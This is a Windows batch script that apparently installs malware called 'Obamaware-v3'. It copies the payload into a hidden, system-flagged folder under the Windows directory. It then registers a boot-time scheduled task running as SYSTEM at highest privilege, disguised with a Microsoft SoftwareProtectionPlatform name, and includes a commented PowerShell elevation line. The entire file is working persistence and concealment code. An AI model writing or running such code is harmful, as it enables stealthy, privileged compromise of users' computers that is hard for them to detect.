@echo off
md %windir%\bin 2>nul
xcopy "%LOCALAPPDATA%\Obamaware-v3" "%windir%\bin" /E /I /Y /Q
attrib +h +s "C:\Windows\bin"
schtasks /create /tn "\Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTask" /tr "cmd /c \"%windir%\bin\win_start.cmd\"" /sc onstart /ru SYSTEM /f /rl HIGHEST /it /delay 0000:05 >nul 2>&1
REM powershell -c "Start-Process explorer -ArgumentList '/root, "PATH_TO_BATCH_OR_EXE"' -Verb RunAs"
